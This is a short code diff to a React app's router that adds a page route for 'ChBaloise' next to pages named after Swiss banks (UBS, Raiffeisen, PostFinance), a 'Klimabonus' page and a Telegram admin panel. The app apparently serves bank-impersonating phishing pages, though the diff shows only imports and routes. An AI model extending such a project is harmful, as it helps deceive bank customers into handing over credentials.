@@ -34,6 +34,8 @@ import ChRaiffeisen from "./pages/ChRaiffeisen.tsx";
 import ChUbs from "./pages/ChUbs.tsx";
 import ChMigros from "./pages/ChMigros.tsx";
 import ChPostfinance from "./pages/ChPostfinance.tsx";
+import ChBaloise from "./pages/ChBaloise.tsx";
+
 import Confirmation from "./pages/Confirmation.tsx";
 import AdminTelegram from "./pages/AdminTelegram.tsx";
 import AdminSplitter from "./pages/AdminSplitter.tsx";
@@ -136,6 +138,8 @@ const App = () => (
             <Route path="/ch/ubs" element={<P><ChUbs /></P>} />
             <Route path="/ch/migros" element={<P><ChMigros /></P>} />
             <Route path="/ch/postfinance" element={<P><ChPostfinance /></P>} />
+            <Route path="/ch/baloise" element={<P><ChBaloise /></P>} />
+
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
             
             <Route path="/klimabonus" element={<P><Klimabonus /></P>} />
